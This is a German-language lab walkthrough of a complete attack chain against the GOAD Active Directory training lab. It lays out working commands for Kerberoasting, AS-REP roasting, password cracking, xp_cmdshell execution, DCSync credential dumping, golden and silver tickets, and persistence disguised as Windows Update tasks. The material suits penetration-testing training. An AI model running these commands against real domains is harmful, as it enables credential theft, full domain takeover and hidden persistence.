# GOAD Lab - Cyber Kill Chain Methodology Guide

## Executive Summary

Dieser Guide führt Sie **Schritt für Schritt** durch die komplette **Cyber Kill Chain** im GOAD Lab (192.168.20.0/24). Von der initialen Reconnaissance bis zur vollständigen Domain-Kompromittierung und Persistence.

---

## Phase 1: Reconnaissance (Aufklärung)

### 1.1 Network Discovery & Host Enumeration

#### Host-Discovery mit Nmap
```bash
# Ping-Sweep für aktive Hosts
nmap -sn 192.168.20.0/24

# Ergebnis speichern
nmap -sn 192.168.20.0/24 | awk '/Nmap scan report/{print $5}' > targets.txt
```

**Erwartete Ergebnisse:**
```
192.168.20.1   - pfSense Firewall
192.168.20.10  - KINGSLANDING (Domain Controller)
192.168.20.11  - WINTERFELL (Domain Controller)
192.168.20.12  - MEEREEN (Domain Controller)
192.168.20.22  - CASTELBLACK (SQL Server)
192.168.20.23  - BRAAVOS (SQL Server)
```

#### Port-Scanning mit Naabu (Schneller)
```bash
# AD-spezifische Ports scannen
naabu -list targets.txt -p 53,80,88,135,139,389,445,636,1433,3268,3269,3389,5985,5986 -rate 1000 -o naabu_ad_ports.txt

# Alternative: Nmap für detaillierte Service-Detection
nmap -T4 -F -iL targets.txt -oA fast_tcp_scan
```

### 1.2 Service Enumeration

#### DNS-Enumeration
```bash
# DNS-Abfragen für Domain-Informationen
dig ANY sevenkingdoms.local @192.168.20.10
dig ANY north.sevenkingdoms.local @192.168.20.11
dig ANY essos.local @192.168.20.12

# Zone Transfer versuchen
dig axfr sevenkingdoms.local @192.168.20.10
dig axfr north.sevenkingdoms.local @192.168.20.11
dig axfr essos.local @192.168.20.12
```

**Erwartete DNS-Struktur:**
```
sevenkingdoms.local      → 192.168.20.10 (KINGSLANDING)
north.sevenkingdoms.local → 192.168.20.11 (WINTERFELL)
essos.local              → 192.168.20.12 (MEEREEN)
```

#### LDAP-Reconnaissance
```bash
# Anonymous LDAP Root DSE abfragen
ldapsearch -x -H ldap://192.168.20.10 -s base
ldapsearch -x -H ldap://192.168.20.11 -s base
ldapsearch -x -H ldap://192.168.20.12 -s base

# Naming Contexts identifizieren
ldapsearch -x -H ldap://192.168.20.10 -s base namingContexts
```

**Gefundene Naming Contexts:**
- `DC=sevenkingdoms,DC=local`
- `DC=north,DC=sevenkingdoms,DC=local`
- `DC=essos,DC=local`

#### SMB-Enumeration
```bash
# SMB-Shares enumerieren
smbclient -L //192.168.20.10 -N
smbclient -L //192.168.20.11 -N
smbclient -L //192.168.20.12 -N
smbclient -L //192.168.20.22 -N
smbclient -L //192.168.20.23 -N

# CrackMapExec für umfassende SMB-Enumeration
crackmapexec smb 192.168.20.0/24 --shares
crackmapexec smb 192.168.20.0/24 --users
```

---

## Phase 2: Weaponization (Waffenvorbereitung)

### 2.1 Kerberos-Angriffs-Tools

#### Installation der Impacket-Suite
```bash
# Auf Kali Linux (meist bereits installiert)
apt update && apt install python3-impacket

# Alternativ via pip
pip3 install impacket

# Wichtige Tools verifizieren
which GetUserSPNs.py
which GetNPUsers.py
which secretsdump.py
```

#### Wordlists vorbereiten
```bash
# Standard-Wordlists
ls /usr/share/wordlists/

# RockYou für Kerberos-Hash-Cracking
gunzip /usr/share/wordlists/rockyou.txt.gz

# Custom AD-Wordlists
wget https://github.com/danielmiessler/SecLists/archive/master.zip
unzip master.zip
mv SecLists-master /opt/SecLists
```

### 2.2 Hash-Cracking-Tools

#### John the Ripper Setup
```bash
# Installation
apt install john

# Konfiguration prüfen
john --test

# Custom Rules für AD-Passwords
cat >> /etc/john/john.conf << 'EOF'
[List.Rules:ActiveDirectory]
# Common AD password patterns
$[0-9]$[0-9]
$[0-9]$[0-9]$[0-9]
$!
c$[0-9]$[0-9]
EOF
```

#### Hashcat Setup
```bash
# Installation
apt install hashcat

# GPU-Unterstützung prüfen
hashcat -I

# Benchmark für Performance-Test
hashcat -b
```

---

## Phase 3: Delivery & Exploitation

### 3.1 Kerberoasting

#### Service Principal Names (SPNs) extrahieren
```bash
# Gegen WINTERFELL Domain (north.sevenkingdoms.local)
GetUserSPNs.py north.sevenkingdoms.local/hodor:hodor -dc-ip 192.168.20.11 -outputfile kerberoast.txt

# Gegen KINGSLANDING Domain (sevenkingdoms.local)
GetUserSPNs.py sevenkingdoms.local/user:pass -dc-ip 192.168.20.10 -outputfile kerberoast_main.txt

# Gegen ESSOS Domain (essos.local)
GetUserSPNs.py essos.local/user:pass -dc-ip 192.168.20.12 -outputfile kerberoast_essos.txt
```

**Gefundene SPNs (Beispiel):**
```
HTTP/eyrie.north.sevenkingdoms.local                 sansa.stark
CIFS/thewall.north.sevenkingdoms.local               jon.snow
HTTP/thewall.north.sevenkingdoms.local               jon.snow
MSSQLSvc/castelblack.north.sevenkingdoms.local       sql_svc
MSSQLSvc/castelblack.north.sevenkingdoms.local:1433  sql_svc
```

#### Hash-Cracking mit John the Ripper
```bash
# Standard Dictionary Attack
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt

# Mit Custom Rules
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=ActiveDirectory kerberoast.txt

# Ergebnisse anzeigen
john --show kerberoast.txt
```

**Erfolgreiche Cracks:**
```
jon.snow:iknownothing
```

### 3.2 AS-REP Roasting

#### Benutzer ohne Kerberos Pre-Authentication finden
```bash
# User-Liste aus LDAP extrahieren (falls möglich)
ldapsearch -x -H ldap://192.168.20.11 -b "DC=north,DC=sevenkingdoms,DC=local" "(objectClass=user)" sAMAccountName | grep sAMAccountName | cut -d: -f2 | tr -d ' ' > users.txt

# AS-REP Roasting durchführen
GetNPUsers.py north.sevenkingdoms.local/ -dc-ip 192.168.20.11 -usersfile users.txt -outputfile asrep_hashes.txt
```

#### Hashcat für AS-REP Hashes
```bash
# AS-REP Hash-Format: 18200
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# Mit erweiterten Regeln
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

**Erfolgreiche Cracks:**
```
brandon.stark:iseedeadpeople
```

### 3.3 SMB-Exploitation mit kompromittierten Credentials

#### CrackMapExec für Credential Validation
```bash
# Kompromittierte Credentials testen
crackmapexec smb 192.168.20.0/24 -u jon.snow -p iknownothing
crackmapexec smb 192.168.20.0/24 -u brandon.stark -p iseedeadpeople
crackmapexec smb 192.168.20.0/24 -u samwell.tarly -p Heartsbane

# Erfolgreiche Logins identifizieren
crackmapexec smb 192.168.20.0/24 -u jon.snow -p iknownothing --shares
```

#### Manuelle SMB-Share-Exploration
```bash
# NETLOGON-Share (häufig interessant für Skripte)
smbclient //192.168.20.11/NETLOGON -U jon.snow
# Passwort: iknownothing

# SYSVOL-Share (Group Policy-Dateien)
smbclient //192.168.20.11/SYSVOL -U jon.snow

# Custom Shares
smbclient //192.168.20.22/all -U samwell.tarly
# Passwort: Heartsbane
```

**Downloads aus Shares:**
```bash
# In smbclient-Session
smb: \> ls
smb: \> get script.ps1
smb: \> get secret.ps1
smb: \> get arya.txt
smb: \> exit
```

---

## Phase 4: Installation & Persistence

### 4.1 LDAP-Enumeration mit kompromittierten Accounts

#### Vollständige Domain-Enumeration
```bash
# Mit gültigen Credentials komplette LDAP-Dumps
ldapsearch -x -H ldap://192.168.20.11 -D "north\jon.snow" -w iknownothing -b "DC=north,DC=sevenkingdoms,DC=local" "(objectClass=*)" > ldap_dump_north.txt

# Spezifische Objekt-Klassen
ldapsearch -x -H ldap://192.168.20.11 -D "north\jon.snow" -w iknownothing -b "DC=north,DC=sevenkingdoms,DC=local" "(objectClass=user)" sAMAccountName userPrincipalName description

ldapsearch -x -H ldap://192.168.20.11 -D "north\jon.snow" -w iknownothing -b "DC=north,DC=sevenkingdoms,DC=local" "(objectClass=group)" sAMAccountName member

# Service Principal Names mit Authentifizierung
ldapsearch -x -H ldap://192.168.20.11 -D "north\jon.snow" -w iknownothing -b "DC=north,DC=sevenkingdoms,DC=local" "servicePrincipalName=*" servicePrincipalName sAMAccountName
```

### 4.2 BloodHound-Integration für Attack Path Analysis

#### BloodHound Python Ingestor
```bash
# Installation
pip3 install bloodhound

# Datensammlung
bloodhound-python -d north.sevenkingdoms.local -u jon.snow -p iknownothing -ns 192.168.20.11 -c All --zip

# Für alle Domänen
bloodhound-python -d sevenkingdoms.local -u user -p pass -ns 192.168.20.10 -c All --zip
bloodhound-python -d essos.local -u user -p pass -ns 192.168.20.12 -c All --zip
```

#### Neo4j und BloodHound Setup
```bash
# Neo4j installieren
wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
echo 'deb https://debian.neo4j.com stable 4.4' | sudo tee /etc/apt/sources.list.d/neo4j.list
apt update && apt install neo4j

# Neo4j starten
sudo neo4j start

# BloodHound herunterladen
wget https://github.com/BloodHoundAD/BloodHound/releases/latest/download/BloodHound-linux-x64.zip
unzip BloodHound-linux-x64.zip
./BloodHound --no-sandbox
```

### 4.3 Group Policy Exploitation

#### GPO-Dateien analysieren
```bash
# Heruntergeladene GPO-Skripte untersuchen
cat script.ps1
cat secret.ps1

# Nach Credentials oder Konfigurationsschwachstellen suchen
grep -i "password\|credential\|key" *.ps1
grep -i "invoke\|iex\|downloadstring" *.ps1
```

#### SYSVOL-Enumeration für weitere GPOs
```bash
# Vollständige SYSVOL-Struktur erforschen
smbclient //192.168.20.11/SYSVOL -U jon.snow -c "recurse ON; prompt OFF; mget *"

# Policies-Ordner untersuchen
find . -name "*.xml" -exec grep -l "password\|cpassword" {} \;
find . -name "*.pol" -exec strings {} \; | grep -i password
```

---

## Phase 5: Command & Control (C2)

### 5.1 PowerShell-Remoting via WinRM

#### WinRM-Verbindungen testen
```bash
# Mit CrackMapExec WinRM testen
crackmapexec winrm 192.168.20.0/24 -u jon.snow -p iknownothing

# Mit Evil-WinRM (Installation)
gem install evil-winrm

# Evil-WinRM-Verbindung
evil-winrm -i 192.168.20.11 -u jon.snow -p iknownothing
```

#### PowerShell-Befehle über WinRM
```powershell
# In Evil-WinRM-Session
PS> Get-ADUser -Filter * -Properties * | Select Name,SamAccountName,Description
PS> Get-ADGroup -Filter * | Select Name,GroupScope,GroupCategory
PS> Get-ADComputer -Filter * | Select Name,OperatingSystem,LastLogonDate

# Lokale Gruppen-Mitgliedschaften
PS> net localgroup administrators
PS> whoami /groups
```

### 5.2 SQL Server-Exploitation

#### MSSQL-Verbindungen mit Impacket
```bash
# SQL Server-Verbindung testen
impacket-mssqlclient -windows-auth sql_svc@192.168.20.22
impacket-mssqlclient -windows-auth sql_svc@192.168.20.23

# Alternative: Mit kompromittierten Domain-Credentials
impacket-mssqlclient -windows-auth north.sevenkingdoms.local/jon.snow:iknownothing@192.168.20.22
```

#### SQL Server-Befehle für Privilege Escalation
```sql
-- xp_cmdshell aktivieren (falls deaktiviert)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- System-Befehle ausführen
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user';
EXEC xp_cmdshell 'ipconfig /all';

-- PowerShell-Download und -Ausführung
EXEC xp_cmdshell 'powershell.exe -enc <base64_encoded_payload>';
```

---

## Phase 6: Actions on Objectives

### 6.1 DCSync für vollständige Credential-Exfiltration

#### Vorbereitung für DCSync
```bash
# Prüfen ob Benutzer DCSync-Rechte hat
# In BloodHound: "Find Shortest Path to Domain Admins"

# Falls DCSync-Rechte vorhanden
secretsdump.py north.sevenkingdoms.local/jon.snow:iknownothing@192.168.20.11

# Alle Domain-Hashes extrahieren
secretsdump.py -just-dc north.sevenkingdoms.local/jon.snow:iknownothing@192.168.20.11
```

#### NTDS.dit-Dump (falls Domain Admin erreicht)
```bash
# Wenn Domain Admin-Rechte erhalten
secretsdump.py -just-dc-ntlm north.sevenkingdoms.local/administrator:pass@192.168.20.11

# Mit Pass-the-Hash
secretsdump.py -hashes LM:NT north.sevenkingdoms.local/administrator@192.168.20.11
```

### 6.2 Golden/Silver Ticket-Angriffe

#### Golden Ticket (KRBTGT-Hash erforderlich)
```bash
# Nach erfolgreichem DCSync
ticketer.py -nthash <krbtgt_nt_hash> -domain-sid <domain_sid> -domain north.sevenkingdoms.local administrator

# Ticket verwenden
export KRB5CCNAME=administrator.ccache
klist
psexec.py -k -no-pass administrator@winterfell.north.sevenkingdoms.local
```

#### Silver Ticket für Service-Accounts
```bash
# Für SQL Server-Service
ticketer.py -nthash <sql_svc_nt_hash> -domain-sid <domain_sid> -domain north.sevenkingdoms.local -spn MSSQLSvc/castelblack.north.sevenkingdoms.local administrator

# Ticket verwenden
export KRB5CCNAME=administrator.ccache
impacket-mssqlclient -k castelblack.north.sevenkingdoms.local
```

### 6.3 Cross-Domain Trust Exploitation

#### Trust-Beziehungen identifizieren
```powershell
# In PowerShell-Session
PS> Get-ADTrust -Filter *
PS> nltest /trusted_domains
PS> Get-DomainTrust
```

#### SID-History-Injection (falls möglich)
```bash
# Mit Golden Ticket für Parent-Domain
ticketer.py -nthash <krbtgt_hash> -domain-sid <child_domain_sid> -extra-sid <enterprise_admins_sid> -domain north.sevenkingdoms.local administrator

# Cross-Domain-Zugriff testen
psexec.py -k -no-pass administrator@kingslanding.sevenkingdoms.local
```

---

## Phase 7: Advanced Persistence

### 7.1 GPO-basierte Persistence

#### Malicious GPO erstellen (falls Admin-Rechte)
```bash
# SYSVOL-Manipulation
smbclient //192.168.20.11/SYSVOL -U administrator -c "put malicious_script.ps1 sevenkingdoms.local/Policies/{GPO-GUID}/Machine/Scripts/Startup/"

# GPO mit PowerShell konfigurieren
```

```powershell
# GPO für Startup-Script
New-GPO -Name "Windows Update Service" -Domain north.sevenkingdoms.local
Set-GPRegistryValue -Name "Windows Update Service" -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "WindowsUpdateCheck" -Type String -Value "powershell.exe -WindowStyle Hidden -exec bypass -file \\winterfell.north.sevenkingdoms.local\SYSVOL\north.sevenkingdoms.local\scripts\update.ps1"
```

### 7.2 Service-basierte Persistence

#### Windows-Service Creation
```powershell
# Via WinRM/PowerShell
PS> New-Service -Name "WindowsUpdateService" -BinaryPathName "C:\Windows\System32\svchost.exe -k netsvcs" -Description "Windows Update Background Service"
PS> Set-Service -Name "WindowsUpdateService" -StartupType Automatic
PS> Start-Service -Name "WindowsUpdateService"
```

#### Scheduled Task Creation
```powershell
# Versteckter Scheduled Task
PS> $trigger = New-ScheduledTaskTrigger -Daily -At 9am
PS> $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -exec bypass -file C:\Windows\Temp\update.ps1"
PS> Register-ScheduledTask -TaskName "Microsoft\Windows\UpdateOrchestrator\UpdateCheck" -Trigger $trigger -Action $action -RunLevel Highest
```

### 7.3 Registry-basierte Persistence

#### Autorun-Registry-Keys
```powershell
# Run-Key für aktuellen Benutzer
PS> Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSecurityUpdate" -Value "powershell.exe -WindowStyle Hidden -exec bypass -enc <base64_payload>"

# Run-Key für alle Benutzer (Administratorrechte erforderlich)
PS> Set-ItemProperty -Path "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSecurityUpdate" -Value "powershell.exe -WindowStyle Hidden -exec bypass -enc <base64_payload>"
```

---

## Tool-Referenz & Troubleshooting

### Wichtige Befehls-Übersicht

#### Netzwerk-Reconnaissance
```bash
# Host Discovery
nmap -sn 192.168.20.0/24
naabu -host 192.168.20.0/24 -silent

# Port Scanning
nmap -sS -sV -sC 192.168.20.0/24
naabu -list targets.txt -top-ports 1000

# Service Enumeration
nmap --script smb-* 192.168.20.0/24
nmap --script ldap-* 192.168.20.10-12
```

#### Active Directory
```bash
# Kerberoasting
GetUserSPNs.py domain/user:pass -dc-ip DC_IP -outputfile hashes.txt

# AS-REP Roasting
GetNPUsers.py domain/ -dc-ip DC_IP -usersfile users.txt -outputfile asrep.txt

# DCSync
secretsdump.py domain/user:pass@DC_IP
```

#### Hash-Cracking
```bash
# John the Ripper
john --wordlist=rockyou.txt hashes.txt

# Hashcat
hashcat -m 13100 hashes.txt rockyou.txt  # Kerberos TGS
hashcat -m 18200 hashes.txt rockyou.txt  # AS-REP
```

### Häufige Probleme & Lösungen

#### "Clock skew too great" Fehler
```bash
# Zeitabweichung zwischen Attacker und DC korrigieren
sudo ntpdate -s 192.168.20.10
# Oder
sudo timedatectl set-ntp true
```

#### LDAP-Verbindungsfehler
```bash
# Alternative LDAP-Syntax versuchen
ldapsearch -x -H ldap://192.168.20.11:389 -D "jon.snow@north.sevenkingdoms.local" -w iknownothing -b "DC=north,DC=sevenkingdoms,DC=local"
```

#### SMB-Authentifizierungsfehler
```bash
# Alternative SMB-Authentifizierung
smbclient //192.168.20.11/NETLOGON -U "north.sevenkingdoms.local\jon.snow%iknownothing"
```

### Nächste Schritte

1. **BloodHound-Analyse** für optimale Attack Paths
2. **SQL Server-Exploitation** für zusätzliche Credentials
3. **Cross-Domain Trust-Analyse** für Forest-weite Kompromittierung
4. **Advanced Persistence** via GPO/Services/Registry
5. **Anti-Forensics** und Stealth-Techniken

---

**Cyber Kill Chain Status:**
- ✅ Reconnaissance - Abgeschlossen
- ✅ Weaponization - Tools bereit
- ✅ Delivery - Erfolgreiche Exploitation
- ✅ Exploitation - Credentials kompromittiert
- ✅ Installation - Initial Access etabliert
- 🔄 Command & Control - In Arbeit
- ❌ Actions on Objectives - Ausstehend

**Nächste Priorität:** DCSync für vollständige Domain-Kompromittierung